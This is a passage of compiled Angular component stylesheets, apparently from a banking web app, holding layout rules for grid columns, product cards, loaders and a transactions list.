      .col-lg-7[_ngcontent-qmv-c253] {
        flex: 0 0 58.3333333333%;
        max-width: 58.3333333333%
      }

      .col-lg-8[_ngcontent-qmv-c253] {
        flex: 0 0 66.6666666667%;
        max-width: 66.6666666667%
      }

      .col-lg-9[_ngcontent-qmv-c253] {
        flex: 0 0 75%;
        max-width: 75%
      }

      .col-lg-10[_ngcontent-qmv-c253] {
        flex: 0 0 83.3333333333%;
        max-width: 83.3333333333%
      }

      .col-lg-11[_ngcontent-qmv-c253] {
        flex: 0 0 91.6666666667%;
        max-width: 91.6666666667%
      }

      .col-lg-12[_ngcontent-qmv-c253] {
        flex: 0 0 100%;
        max-width: 100%
      }

      .order-lg-first[_ngcontent-qmv-c253] {
        order: -1
      }

      .order-lg-last[_ngcontent-qmv-c253] {
        order: 13
      }

      .order-lg-0[_ngcontent-qmv-c253] {
        order: 0
      }

      .order-lg-1[_ngcontent-qmv-c253] {
        order: 1
      }

      .order-lg-2[_ngcontent-qmv-c253] {
        order: 2
      }

      .order-lg-3[_ngcontent-qmv-c253] {
        order: 3
      }

      .order-lg-4[_ngcontent-qmv-c253] {
        order: 4
      }

      .order-lg-5[_ngcontent-qmv-c253] {
        order: 5
      }

      .order-lg-6[_ngcontent-qmv-c253] {
        order: 6
      }

      .order-lg-7[_ngcontent-qmv-c253] {
        order: 7
      }

      .order-lg-8[_ngcontent-qmv-c253] {
        order: 8
      }

      .order-lg-9[_ngcontent-qmv-c253] {
        order: 9
      }

      .order-lg-10[_ngcontent-qmv-c253] {
        order: 10
      }

      .order-lg-11[_ngcontent-qmv-c253] {
        order: 11
      }

      .order-lg-12[_ngcontent-qmv-c253] {
        order: 12
      }

      .offset-lg-0[_ngcontent-qmv-c253] {
        margin-left: 0
      }

      .offset-lg-1[_ngcontent-qmv-c253] {
        margin-left: 8.3333333333%
      }

      .offset-lg-2[_ngcontent-qmv-c253] {
        margin-left: 16.6666666667%
      }

      .offset-lg-3[_ngcontent-qmv-c253] {
        margin-left: 25%
      }

      .offset-lg-4[_ngcontent-qmv-c253] {
        margin-left: 33.3333333333%
      }

      .offset-lg-5[_ngcontent-qmv-c253] {
        margin-left: 41.6666666667%
      }

      .offset-lg-6[_ngcontent-qmv-c253] {
        margin-left: 50%
      }

      .offset-lg-7[_ngcontent-qmv-c253] {
        margin-left: 58.3333333333%
      }

      .offset-lg-8[_ngcontent-qmv-c253] {
        margin-left: 66.6666666667%
      }

      .offset-lg-9[_ngcontent-qmv-c253] {
        margin-left: 75%
      }

      .offset-lg-10[_ngcontent-qmv-c253] {
        margin-left: 83.3333333333%
      }

      .offset-lg-11[_ngcontent-qmv-c253] {
        margin-left: 91.6666666667%
      }
    }

    @media (min-width: 1200px) {
      .col-xl[_ngcontent-qmv-c253] {
        flex-basis: 0;
        flex-grow: 1;
        max-width: 100%
      }

      .col-xl-auto[_ngcontent-qmv-c253] {
        flex: 0 0 auto;
        width: auto;
        max-width: none
      }

      .col-xl-1[_ngcontent-qmv-c253] {
        flex: 0 0 8.3333333333%;
        max-width: 8.3333333333%
      }

      .col-xl-2[_ngcontent-qmv-c253] {
        flex: 0 0 16.6666666667%;
        max-width: 16.6666666667%
      }

      .col-xl-3[_ngcontent-qmv-c253] {
        flex: 0 0 25%;
        max-width: 25%
      }

      .col-xl-4[_ngcontent-qmv-c253] {
        flex: 0 0 33.3333333333%;
        max-width: 33.3333333333%
      }

      .col-xl-5[_ngcontent-qmv-c253] {
        flex: 0 0 41.6666666667%;
        max-width: 41.6666666667%
      }

      .col-xl-6[_ngcontent-qmv-c253] {
        flex: 0 0 50%;
        max-width: 50%
      }

      .col-xl-7[_ngcontent-qmv-c253] {
        flex: 0 0 58.3333333333%;
        max-width: 58.3333333333%
      }

      .col-xl-8[_ngcontent-qmv-c253] {
        flex: 0 0 66.6666666667%;
        max-width: 66.6666666667%
      }

      .col-xl-9[_ngcontent-qmv-c253] {
        flex: 0 0 75%;
        max-width: 75%
      }

      .col-xl-10[_ngcontent-qmv-c253] {
        flex: 0 0 83.3333333333%;
        max-width: 83.3333333333%
      }

      .col-xl-11[_ngcontent-qmv-c253] {
        flex: 0 0 91.6666666667%;
        max-width: 91.6666666667%
      }

      .col-xl-12[_ngcontent-qmv-c253] {
        flex: 0 0 100%;
        max-width: 100%
      }

      .order-xl-first[_ngcontent-qmv-c253] {
        order: -1
      }

      .order-xl-last[_ngcontent-qmv-c253] {
        order: 13
      }

      .order-xl-0[_ngcontent-qmv-c253] {
        order: 0
      }

      .order-xl-1[_ngcontent-qmv-c253] {
        order: 1
      }

      .order-xl-2[_ngcontent-qmv-c253] {
        order: 2
      }

      .order-xl-3[_ngcontent-qmv-c253] {
        order: 3
      }

      .order-xl-4[_ngcontent-qmv-c253] {
        order: 4
      }

      .order-xl-5[_ngcontent-qmv-c253] {
        order: 5
      }

      .order-xl-6[_ngcontent-qmv-c253] {
        order: 6
      }

      .order-xl-7[_ngcontent-qmv-c253] {
        order: 7
      }

      .order-xl-8[_ngcontent-qmv-c253] {
        order: 8
      }

      .order-xl-9[_ngcontent-qmv-c253] {
        order: 9
      }

      .order-xl-10[_ngcontent-qmv-c253] {
        order: 10
      }

      .order-xl-11[_ngcontent-qmv-c253] {
        order: 11
      }

      .order-xl-12[_ngcontent-qmv-c253] {
        order: 12
      }

      .offset-xl-0[_ngcontent-qmv-c253] {
        margin-left: 0
      }

      .offset-xl-1[_ngcontent-qmv-c253] {
        margin-left: 8.3333333333%
      }

      .offset-xl-2[_ngcontent-qmv-c253] {
        margin-left: 16.6666666667%
      }

      .offset-xl-3[_ngcontent-qmv-c253] {
        margin-left: 25%
      }

      .offset-xl-4[_ngcontent-qmv-c253] {
        margin-left: 33.3333333333%
      }

      .offset-xl-5[_ngcontent-qmv-c253] {
        margin-left: 41.6666666667%
      }

      .offset-xl-6[_ngcontent-qmv-c253] {
        margin-left: 50%
      }

      .offset-xl-7[_ngcontent-qmv-c253] {
        margin-left: 58.3333333333%
      }

      .offset-xl-8[_ngcontent-qmv-c253] {
        margin-left: 66.6666666667%
      }

      .offset-xl-9[_ngcontent-qmv-c253] {
        margin-left: 75%
      }

      .offset-xl-10[_ngcontent-qmv-c253] {
        margin-left: 83.3333333333%
      }

      .offset-xl-11[_ngcontent-qmv-c253] {
        margin-left: 91.6666666667%
      }
    }

    @media (min-width: 768px) {
      .container-products-movements[_ngcontent-qmv-c253] {
        padding: 0 3rem
      }
    }

    @media (min-width: 992px) {
      .container-products-movements[_ngcontent-qmv-c253] {
        padding: 0 2rem
      }
    }
  </style>
  <style>
    @keyframes _ngcontent-qmv-c252_arrows {
      0% {
        opacity: 0;
        transform: rotate(45deg) translate(-10px, -10px)
      }

      50% {
        opacity: 1
      }

      to {
        opacity: 0;
        transform: rotate(45deg) translate(0)
      }
    }

    @keyframes _ngcontent-qmv-c252_spin {
      to {
        transform: rotate(360deg)
      }
    }

    .scrollbar-wrapper[_ngcontent-qmv-c252] {
      display: flex;
      flex-wrap: nowrap;
      overflow-x: auto;
      overflow-y: hidden;
      white-space: nowrap
    }

    .scrollbar-wrapper[_ngcontent-qmv-c252]::-webkit-scrollbar {
      display: none
    }

    .scrollbar-wrapper[_ngcontent-qmv-c252] .scroll-content[_ngcontent-qmv-c252] {
      display: inline-block;
      width: 100%;
      height: 260px
    }

    .scrollbar-wrapper[_ngcontent-qmv-c252] .scroll-content[_ngcontent-qmv-c252] .drag-scroll-content {
      display: flex !important
    }

    .scrollbar-wrapper[_ngcontent-qmv-c252] .scroll-content.collapsed[_ngcontent-qmv-c252] {
      height: 135px
    }

    .arrow[_ngcontent-qmv-c252] {
      display: none;
      height: 240px;
      width: 60px;
      position: absolute;
      cursor: pointer
    }

    .arrow.collapsed[_ngcontent-qmv-c252] {
      height: 100px
    }

    .arrow[_ngcontent-qmv-c252] .icon[_ngcontent-qmv-c252] {
      font-size: 35px;
      color: #0048db
    }

    @media (min-width: 768px) {
      .arrow[_ngcontent-qmv-c252] {
        display: flex;
        justify-content: center;
        flex-direction: column;
        width: 100px
      }
    }

    .arrow.prev[_ngcontent-qmv-c252] {
      top: 0;
      left: 0;
      opacity: .9;
      align-items: flex-end;
      background: linear-gradient(to left, rgba(241, 243, 246, 0), #F1F3F6 85%)
    }

    .arrow.prev[_ngcontent-qmv-c252] .icon[_ngcontent-qmv-c252] {
      margin-right: 1rem
    }

    .arrow.next[_ngcontent-qmv-c252] {
      top: 0;
      right: 0;
      opacity: .9;
      align-items: flex-start;
      background: linear-gradient(to right, rgba(241, 243, 246, 0), #F1F3F6 85%)
    }

    .arrow.next[_ngcontent-qmv-c252] .icon[_ngcontent-qmv-c252] {
      margin-left: 1rem
    }

    .card-product[_ngcontent-qmv-c252]:not(:empty) {
      position: relative;
      display: flex;
      flex-direction: column;
      word-wrap: break-word;
      background-color: #fff;
      background-clip: border-box;
      margin: 0 24px 0 0 !important;
      width: auto;
      height: 240px;
      max-height: 240px;
      border: 1px solid #dbe2e8;
      border-radius: 8px;
      padding: 0
    }

    .card-product.collapsed[_ngcontent-qmv-c252] {
      height: 100px
    }

    .card-product[_ngcontent-qmv-c252]:first-child {
      margin-left: 1rem !important
    }

    @media (min-width: 768px) {
      .card-product[_ngcontent-qmv-c252]:first-child {
        margin-left: 2rem !important
      }
    }

    .card-product[_ngcontent-qmv-c252]:last-child {
      margin-right: 2rem !important
    }

    .vip-customer-advisor[_ngcontent-qmv-c252] {
      display: flex;
      align-items: center;
      margin: 0 0 16px
    }

    @media (min-width: 768px) {
      .vip-customer-advisor[_ngcontent-qmv-c252] {
        margin: 0 0 24px
      }
    }

    @media (min-width: 1200px) {
      .vip-customer-advisor[_ngcontent-qmv-c252] {
        order: 2;
        margin-bottom: 0
      }
    }

    .vip-customer-advisor[_ngcontent-qmv-c252] span.icon-before[_ngcontent-qmv-c252] {
      font-size: 16px;
      margin-right: 8px
    }

    .vip-customer-advisor[_ngcontent-qmv-c252] span.icon-after[_ngcontent-qmv-c252] {
      font-size: 24px;
      margin-left: 2px;
      color: #0048db;
      cursor: pointer
    }

    .vip-customer-advisor[_ngcontent-qmv-c252] span.label[_ngcontent-qmv-c252] {
      line-height: 1.71;
      font-size: 14px;
      color: #2c2c33
    }

    .vip-customer-advisor[_ngcontent-qmv-c252] span.label[_ngcontent-qmv-c252] a[_ngcontent-qmv-c252] {
      line-height: 2;
      font-size: 12px;
      color: #0048db;
      text-decoration: underline;
      font-weight: 600;
      cursor: pointer
    }

    .toggle-balance[_ngcontent-qmv-c252] {
      display: flex;
      align-items: center;
      cursor: pointer;
      margin-left: 16px
    }

    @media (min-width: 768px) {
      .toggle-balance[_ngcontent-qmv-c252] {
        margin-left: 6px
      }
    }

    .toggle-balance-icon[_ngcontent-qmv-c252] span.icon[_ngcontent-qmv-c252] {
      display: flex;
      margin-right: 8px
    }

    .toggle-balance-icon[_ngcontent-qmv-c252] span.icon[_ngcontent-qmv-c252] i[_ngcontent-qmv-c252] {
      font-size: 16px
    }

    .toggle-balance[_ngcontent-qmv-c252] app-avv-toggle {
      position: relative;
      top: -4px
    }

    .products-cards[_ngcontent-qmv-c252] {
      height: 100%;
      position: relative;
      padding: 24px 0 1rem
    }

    .products-cards[_ngcontent-qmv-c252]:before {
      background-color: #f1f3f6;
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      min-height: 260px;
      width: 100%;
      z-index: -1
    }

    @media (min-width: 375px) {
      .products-cards[_ngcontent-qmv-c252]:before {
        min-height: 255px
      }
    }

    @media (min-width: 768px) {
      .products-cards[_ngcontent-qmv-c252]:before {
        min-height: 235px
      }
    }

    @media (min-width: 1200px) {
      .products-cards[_ngcontent-qmv-c252]:before {
        min-height: 200px
      }
    }

    .products-cards-header[_ngcontent-qmv-c252] {
      display: flex;
      flex-direction: column;
      margin-bottom: 1rem;
      padding: 0 1rem
    }

    .products-cards-header-title[_ngcontent-qmv-c252] h1[_ngcontent-qmv-c252] {
      color: #2c2c33;
      font-size: 18px;
      font-weight: 600;
      line-height: 1.78;
      margin: 0
    }

    @media (min-width: 768px) {
      .products-cards-header[_ngcontent-qmv-c252] {
        padding: 0 2rem;
        margin-bottom: 24px
      }
    }

    .products-cards-header-filters[_ngcontent-qmv-c252] {
      display: flex;
      align-items: center;
      flex-direction: row
    }

    .products-cards-header-filters-title[_ngcontent-qmv-c252] {
      max-width: 230px
    }

    .products-cards-header-filters-title[_ngcontent-qmv-c252] bavv-dropdown.product-dropdown div.bavv-form-input {
      padding: 0 0 10px
    }

    .products-cards-header-filters-title[_ngcontent-qmv-c252] bavv-dropdown.product-dropdown div.bavv-form-input.dropdown ul.dropdown-list {
      max-height: 196px
    }

    .products-cards-header-filters-title[_ngcontent-qmv-c252] bavv-dropdown.product-dropdown div.bavv-form-input.dropdown ul.dropdown-list>li {
      min-height: 2rem
    }

    .products-cards-header-filters-title[_ngcontent-qmv-c252] bavv-dropdown.product-dropdown div.bavv-form-input.dropdown ul.dropdown-list>li>span {
      padding: 1rem
    }

    .products-cards-header-filters-title[_ngcontent-qmv-c252] bavv-dropdown.product-dropdown div.bavv-form-input label {
      height: 2rem
    }

    .products-cards-header-filters-title[_ngcontent-qmv-c252] bavv-dropdown.product-dropdown div.bavv-form-input label input {
      font-size: 14px;
      line-height: 1.71;
      padding: 2px 10px;
      height: 2.5rem;
      border: 1px solid #ACBAC9 !important;
      background-color: #f1f3f6 !important;
      color: #414a53 !important
    }

    .products-cards-header-filters-title[_ngcontent-qmv-c252] bavv-dropdown.product-dropdown div.bavv-form-input label input:not(:placeholder-shown)+.label,
    .products-cards-header-filters-title[_ngcontent-qmv-c252] bavv-dropdown.product-dropdown div.bavv-form-input label input:focus+.label {
      color: #0048db !important
    }

    .products-cards-header-filters-title[_ngcontent-qmv-c252] bavv-dropdown.product-dropdown div.bavv-form-input label input.ng-touched.ng-invalid+.label {
      color: #a00104 !important
    }

    .products-cards-header-filters-title[_ngcontent-qmv-c252] bavv-dropdown.product-dropdown div.bavv-form-input label input.ng-touched.ng-invalid+.label+.bavv-form-border {
      background: #A00104 !important
    }

    .products-cards-header-filters-title[_ngcontent-qmv-c252] bavv-dropdown.product-dropdown div.bavv-form-input label input.ng-touched.ng-invalid+.label+.bavv-form-border+.alert-icon {
      color: #a00104 !important
    }

    .products-cards-header-filters-title[_ngcontent-qmv-c252] bavv-dropdown.product-dropdown div.bavv-form-input label input.ng-touched.ng-invalid+.label+.bavv-form-border+.alert-icon+.bavv-form-icon {
      color: #a00104 !important
    }

    .products-cards-header-filters-title[_ngcontent-qmv-c252] bavv-dropdown.product-dropdown div.bavv-form-input label div.item-selected {
      position: absolute;
      top: 25px;
      left: 16px;
      text-align: left;
      cursor: pointer
    }

    @media (max-width: 390px) {
      .products-cards-header-filters-title[_ngcontent-qmv-c252] bavv-dropdown.product-dropdown div.bavv-form-input label div.item-selected {
        width: 240px;
        white-space: nowrap;
        text-overflow: ellipsis;
        overflow: hidden
      }
    }

    .products-cards-header-filters-title[_ngcontent-qmv-c252] bavv-dropdown.product-dropdown div.bavv-form-input label .bavv-form-icon {
      top: 8px
    }

    .products-cards-header-filters-title[_ngcontent-qmv-c252] bavv-dropdown.product-dropdown div.bavv-form-input label span {
      color: #77899a !important
    }

    .products-cards-header-filters-title[_ngcontent-qmv-c252] h1[_ngcontent-qmv-c252] {
      font-size: 18px;
      line-height: 1.78;
      font-weight: 600;
      margin-bottom: 0
    }

    .products-cards-list-loader[_ngcontent-qmv-c252] {
      padding: 0 1rem;
      margin-bottom: 20px;
      display: flex;
      justify-content: flex-start
    }

    @media (min-width: 768px) {
      .products-cards-list-loader[_ngcontent-qmv-c252] {
        padding: 0 2rem
      }
    }

    .products-cards-list-loader[_ngcontent-qmv-c252] .movements-loader[_ngcontent-qmv-c252] {
      width: 100%;
      height: 100%;
      position: relative;
      padding: 24px
    }

    .products-cards-list-loader[_ngcontent-qmv-c252] .movements-loader[_ngcontent-qmv-c252] .card-loader[_ngcontent-qmv-c252] {
      border-radius: 4px;
      margin-top: 2px;
      height: 25px;
      position: relative
    }

    @media (min-width: 768px) {
      .products-cards-list-loader[_ngcontent-qmv-c252] .movements-loader[_ngcontent-qmv-c252] .card-loader[_ngcontent-qmv-c252] {
        margin-top: 5px
      }
    }

    .products-cards-list-loader[_ngcontent-qmv-c252] .movements-loader[_ngcontent-qmv-c252] .title[_ngcontent-qmv-c252] {
      width: 50%
    }

    .products-cards-list-loader[_ngcontent-qmv-c252] .movements-loader[_ngcontent-qmv-c252] .subtitle[_ngcontent-qmv-c252] {
      width: 60%
    }

    .products-cards-list-loader[_ngcontent-qmv-c252] .movements-loader[_ngcontent-qmv-c252] .filter[_ngcontent-qmv-c252] {
      width: 40%
    }

    .products-cards-list-loader[_ngcontent-qmv-c252] .movements-loader[_ngcontent-qmv-c252] .filter[_ngcontent-qmv-c252]:last-child {
      margin-bottom: 0
    }

    .products-cards-list-loader[_ngcontent-qmv-c252] .movements-loader[_ngcontent-qmv-c252] .description[_ngcontent-qmv-c252] {
      width: 75%
    }

    .products-cards-list-loader[_ngcontent-qmv-c252] .movements-loader[_ngcontent-qmv-c252] .side[_ngcontent-qmv-c252] {
      margin-bottom: 1rem;
      width: 25%
    }

    .products-cards-list-loader[_ngcontent-qmv-c252] .movements-loader[_ngcontent-qmv-c252] .divider[_ngcontent-qmv-c252] {
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      margin-bottom: 1rem
    }

    .products-cards-list-loader[_ngcontent-qmv-c252] .movements-loader[_ngcontent-qmv-c252] .divider[_ngcontent-qmv-c252]:last-child {
      margin-bottom: 0
    }

    .products-cards-list-loader[_ngcontent-qmv-c252] .movements-loader[_ngcontent-qmv-c252] .divider-product[_ngcontent-qmv-c252] {
      display: flex;
      flex-direction: row;
      justify-content: space-between
    }

    .products-cards-list-loader[_ngcontent-qmv-c252] .card-list-loader[_ngcontent-qmv-c252] {
      margin-right: 24px;
      width: 192px;
      height: 240px;
      position: relative;
      background-color: #fff;
      border: 1px solid #dbe2e8;
      border-radius: 8px;
      padding: 24px 24px 0
    }

    .products-cards-list-loader[_ngcontent-qmv-c252] .card-list-loader[_ngcontent-qmv-c252] .divider[_ngcontent-qmv-c252] {
      margin-top: 80px;
      display: flex;
      flex-direction: row;
      justify-content: space-between
    }

    .products-cards-list-loader[_ngcontent-qmv-c252] .card-list-loader[_ngcontent-qmv-c252] .icon[_ngcontent-qmv-c252] {
      width: 24px;
      height: 24px;
      position: relative
    }

    .products-cards-list-loader[_ngcontent-qmv-c252] .card-list-loader[_ngcontent-qmv-c252] .title[_ngcontent-qmv-c252] {
      margin-top: 5px;
      width: 100px;
      height: 24px;
      position: relative
    }

    .products-cards-list-loader[_ngcontent-qmv-c252] .card-list-loader[_ngcontent-qmv-c252] .account[_ngcontent-qmv-c252] {
      margin-top: 5px;
      width: 150px;
      height: 24px;
      position: relative
    }

    .products-cards-list-loader[_ngcontent-qmv-c252] .card-list-loader[_ngcontent-qmv-c252] .side[_ngcontent-qmv-c252] {
      margin-top: 5px;
      width: 50px;
      height: 24px;
      position: relative
    }

    .products-cards-list[_ngcontent-qmv-c252] {
      min-height: 240px;
      position: relative
    }

    @media (min-width: 768px) {
      .products-cards-header[_ngcontent-qmv-c252] {
        justify-content: space-between
      }
    }

    @media (min-width: 992px) {
      .products-cards[_ngcontent-qmv-c252] {
        padding: 24px 0 1rem
      }

      .products-cards-header[_ngcontent-qmv-c252] {
        padding-right: 32px
      }
    }

    @media (min-width: 1200px) {
      .products-cards[_ngcontent-qmv-c252] {
        padding: 24px 0 32px
      }

      .products-cards-header[_ngcontent-qmv-c252] {
        flex-direction: row
      }

      .products-cards-header-title[_ngcontent-qmv-c252] {
        order: 1
      }

      .products-cards-header.loading[_ngcontent-qmv-c252] {
        flex-direction: row
      }
    }
  </style>
  <style>
    @keyframes _ngcontent-qmv-c248_arrows {
      0% {
        opacity: 0;
        transform: rotate(45deg) translate(-10px, -10px)
      }

      50% {
        opacity: 1
      }

      to {
        opacity: 0;
        transform: rotate(45deg) translate(0)
      }
    }

    @keyframes _ngcontent-qmv-c248_spin {
      to {
        transform: rotate(360deg)
      }
    }

    .movements-banners[_ngcontent-qmv-c248] {
      display: flex;
      justify-content: normal;
      gap: 16px;
      overflow-y: hidden;
      padding: 0
    }

    @media (max-width: 767.98px) {
      .movements-banners[_ngcontent-qmv-c248] {
        padding: 0 1rem 1rem
      }
    }

    .movements-banners[_ngcontent-qmv-c248]::-webkit-scrollbar {
      display: none
    }

    .movements-banners__item[_ngcontent-qmv-c248]:not(:empty) {
      min-width: 238px;
      max-width: 238px
    }

    .movements-container[_ngcontent-qmv-c248] {
      display: flex;
      justify-content: space-between;
      padding: 0
    }

    @media (max-width: 767.98px) {
      .movements-container[_ngcontent-qmv-c248] {
        padding: 0 1rem 1rem
      }
    }

    .movements-container__right-side[_ngcontent-qmv-c248] {
      display: flex;
      flex-direction: column;
      max-width: 100%;
      width: 344px
    }

    @media (max-width: 991.98px) {
      .movements-container__right-side[_ngcontent-qmv-c248] {
        width: 100%
      }
    }

    .movements-container__right-side[_ngcontent-qmv-c248] .layout-container[_ngcontent-qmv-c248] {
      width: auto;
      background-color: #fff;
      border: 1px solid #DEE1E4;
      border-radius: 8px;
      margin: 16px
    }

    .movements-container__right-side[_ngcontent-qmv-c248] .layout-container.marketplace[_ngcontent-qmv-c248] {
      margin: 0;
      height: auto;
      border: none
    }

    .movements-container__right-side[_ngcontent-qmv-c248] .layout-container.loaded[_ngcontent-qmv-c248]:not(:empty) {
      border: 1px solid #DEE1E4;
      border-radius: 8px;
      margin: 0
    }

    @media (min-width: 768px) {
      .movements-container__right-side[_ngcontent-qmv-c248] .layout-container.loaded[_ngcontent-qmv-c248]:not(:empty) {
        margin: 8px 16px
      }
    }

    .movements-container__right-side[_ngcontent-qmv-c248] .layout-container.loaded[_ngcontent-qmv-c248]:not(:empty) .mth_border[_ngcontent-qmv-c248] {
      border: none !important
    }

    .movements-container__right-side[_ngcontent-qmv-c248] .layout-container.loaded[_ngcontent-qmv-c248]:not(:empty) .mth_sombra[_ngcontent-qmv-c248] {
      box-shadow: none !important
    }

    .movements-container__right-side[_ngcontent-qmv-c248] .favorites[_ngcontent-qmv-c248] {
      height: 128px
    }

    .movements-container__right-side[_ngcontent-qmv-c248] .digital-debit-card[_ngcontent-qmv-c248] {
      border: 0;
      margin: 16px;
      max-width: 299px !important
    }

    .movements-container__right-side[_ngcontent-qmv-c248] .last-movements[_ngcontent-qmv-c248] {
      min-height: 380px
    }

    @media (min-width: 1024px) {
      .movements-container__right-side[_ngcontent-qmv-c248] .last-movements[_ngcontent-qmv-c248] {
        min-height: 580px
      }
    }

    .movements-container__right-side[_ngcontent-qmv-c248] .pfm[_ngcontent-qmv-c248] {
      height: 384px
    }

    .movements-container__right-side[_ngcontent-qmv-c248] .banner[_ngcontent-qmv-c248] {
      margin-bottom: 24px
    }

    .movements-container__right-side[_ngcontent-qmv-c248] .banner[_ngcontent-qmv-c248],
    .movements-container__right-side[_ngcontent-qmv-c248] .promotions[_ngcontent-qmv-c248] {
      max-width: 300px !important;
      width: -webkit-fill-available;
      align-self: center
    }

    .movements-container__left-side[_ngcontent-qmv-c248] {
      display: flex;
      flex-direction: column;
      align-items: center;
      width: 100%
    }

    .movements-container__left-side[_ngcontent-qmv-c248] .layout-container[_ngcontent-qmv-c248] {
      width: 100%;
      background-color: #fff;
      border: 1px solid #DEE1E4;
      border-radius: 8px;
      margin: 16px
    }

    @media (max-width: 575.98px) {
      .movements-container__left-side[_ngcontent-qmv-c248] .layout-container[_ngcontent-qmv-c248] {
        margin: 0 0 16px
      }
    }

    .movements[_ngcontent-qmv-c248] .login-information[_ngcontent-qmv-c248] {
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: flex-start;
      flex-direction: row;
      border: 0;
      margin: 8px 0 0;
      order: 7
    }

    @media (max-width: 1199.98px) {
      .movements[_ngcontent-qmv-c248] .login-information[_ngcontent-qmv-c248] {
        display: none
      }
    }

    .movements[_ngcontent-qmv-c248] .login-information[_ngcontent-qmv-c248] p[_ngcontent-qmv-c248] {
      margin: 0 0 4px;
      font-size: 10px;
      font-weight: 400;
      line-height: 1.6;
      border: 0 !important;
      color: #5c6b7a
    }

    .movements[_ngcontent-qmv-c248] .login-information[_ngcontent-qmv-c248] p[_ngcontent-qmv-c248]:after {
      position: relative;
      top: -3px;
      content: ".";
      margin: 0 5px
    }

    .movements[_ngcontent-qmv-c248] .login-information[_ngcontent-qmv-c248] p[_ngcontent-qmv-c248]:last-child:after {
      display: none
    }

    @media (max-width: 768px) {
      .movements-container[_ngcontent-qmv-c248] {
        display: block
      }
    }
  </style>
  <style>
    @keyframes arrows {
      0% {
        opacity: 0;
        transform: rotate(45deg) translate(-10px, -10px)
      }

      50% {
        opacity: 1
      }

      to {
        opacity: 0;
        transform: rotate(45deg) translate(0)
      }
    }

    @keyframes spin {
      to {
        transform: rotate(360deg)
      }
    }

    .movements-list-container {
      width: 100%;
      height: 100%;
      position: relative
    }

    .movements-list-container-loader {
      display: flex;
      justify-content: flex-start
    }

    .movements-list-container-loader .movements-loader {
      width: 100%;
      height: 100%;
      position: relative;
      padding: 24px
    }

    .movements-list-container-loader .movements-loader .card-loader {
      border-radius: 4px;
      margin-top: 2px;
      height: 25px;
      position: relative
    }

    @media (min-width: 768px) {
      .movements-list-container-loader .movements-loader .card-loader {
        margin-top: 5px
      }
    }

    .movements-list-container-loader .movements-loader .title {
      width: 50%
    }

    .movements-list-container-loader .movements-loader .subtitle {
      width: 60%
    }

    .movements-list-container-loader .movements-loader .filter {
      width: 40%
    }

    .movements-list-container-loader .movements-loader .filter:last-child {
      margin-bottom: 0
    }

    .movements-list-container-loader .movements-loader .description {
      width: 75%
    }

    .movements-list-container-loader .movements-loader .side {
      margin-bottom: 1rem;
      width: 25%
    }

    .movements-list-container-loader .movements-loader .divider {
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      margin-bottom: 1rem
    }

    .movements-list-container-loader .movements-loader .divider:last-child {
      margin-bottom: 0
    }

    .movements-list-container-loader .movements-loader .divider-product {
      display: flex;
      flex-direction: row;
      justify-content: space-between
    }

    .movements-list-container-loader .card-list-loader {
      margin-right: 24px;
      width: 192px;
      height: 240px;
      position: relative;
      background-color: #fff;
      border: 1px solid #dbe2e8;
      border-radius: 8px;
      padding: 24px 24px 0
    }

    .movements-list-container-loader .card-list-loader .divider {
      margin-top: 80px;
      display: flex;
      flex-direction: row;
      justify-content: space-between
    }

    .movements-list-container-loader .card-list-loader .icon {
      width: 24px;
      height: 24px;
      position: relative
    }

    .movements-list-container-loader .card-list-loader .title {
      margin-top: 5px;
      width: 100px;
      height: 24px;
      position: relative
    }

    .movements-list-container-loader .card-list-loader .account {
      margin-top: 5px;
      width: 150px;
      height: 24px;
      position: relative
    }

    .movements-list-container-loader .card-list-loader .side {
      margin-top: 5px;
      width: 50px;
      height: 24px;
      position: relative
    }

    .movements-list-container-empty {
      width: 100%;
      height: 100%;
      position: relative;
      padding: 24px;
      display: flex;
      flex-direction: column-reverse;
      justify-content: center;
      align-content: center;
      align-items: center
    }

    .movements-list-container-empty-container {
      max-width: 100%
    }

    .movements-list-container-empty-container h1 {
      font-size: 24px;
      line-height: 1.4;
      color: #8e9ba9;
      font-weight: 700
    }

    .movements-list-container-empty-container h2 {
      font-size: 16px;
      line-height: 1.33;
      color: #8e9ba9;
      font-weight: 400
    }

    .movements-list-container-empty-image {
      width: 120px;
      max-width: 150px;
      height: 200px;
      margin-left: -3rem
    }

    @media (min-width: 768px) {
      .movements-list-container-empty {
        flex-direction: row
      }

      .movements-list-container-empty-container h1 {
        font-size: 32px
      }

      .movements-list-container-empty-container h2 {
        font-size: 20px
      }

      .movements-list-container-empty-image {
        width: 150px;
        height: 250px;
        margin-left: 0;
        margin-right: 2rem
      }
    }

    @media (min-width: 1200px) {
      .movements-list-container-empty-container h1 {
        font-size: 40px
      }

      .movements-list-container-empty-container h2 {
        font-size: 24px
      }

      .movements-list-container-empty-image {
        height: 300px
      }
    }

    .movements-list-container-content {
      padding: 1rem
    }

    .movements-list-container-content .header {
      margin-bottom: 1rem
    }

    .movements-list-container-content .header h1 {
      font-size: 18px;
      line-height: 1.78;
      font-weight: 600;
      margin-bottom: 0
    }

    .movements-list-container-content .header h2 {
      font-size: 14px;
      line-height: 1.71;
      font-weight: 400;
      margin-bottom: 0
    }

    .movements-list-container-content .list-movements .items {
      display: flex;
      flex-direction: column
    }

    .movements-list-container-content .list-movements .items .divider {
      height: 1px;
      width: 100%;
      margin-top: 0;
      margin-bottom: 1.5rem
    }

    .movements-list-container-content .list-movements .items .item {
      margin-bottom: 10px
    }

    .movements-list-container-content .list-movements .items .item .description {
      font-size: 14px;
      line-height: 1.71;
      margin-bottom: 0;
      max-width: 85%
    }

    .movements-list-container-content .list-movements .items .item .item-details {
      display: flex;
      flex-direction: row;
      justify-content: space-between;
      position: relative
    }

    .movements-list-container-content .list-movements .items .item .item-details h6 {
      margin-bottom: 0
    }

    .movements-list-container-content .list-movements .items .item .item-details span {
      font-size: 12px;
      line-height: 1.33;
      color: #5c6b7a
    }

    .movements-list-container-content .list-movements .items .item .item-details .add,
    .movements-list-container-content .list-movements .items .item .item-details .add span {
      color: #0014a2
    }

    .movements-list-container-content .list-movements .items .item .item-details .decimal-numbers-format,
    .movements-list-container-content .list-movements .items .item .item-details .sign {
      color: #283747
    }

    .movements-list-container-content .list-movements .items .item .item-details .movement-icon {
      margin-right: 5px
    }

    .movements-list-container-content .list-movements .items .item .item-details .icon-descarga {
      font-size: 1rem;
      color: #0048db;
      cursor: pointer;
      position: absolute;
      bottom: 48px;
      right: 0
    }

    @media (min-width: 375px) {
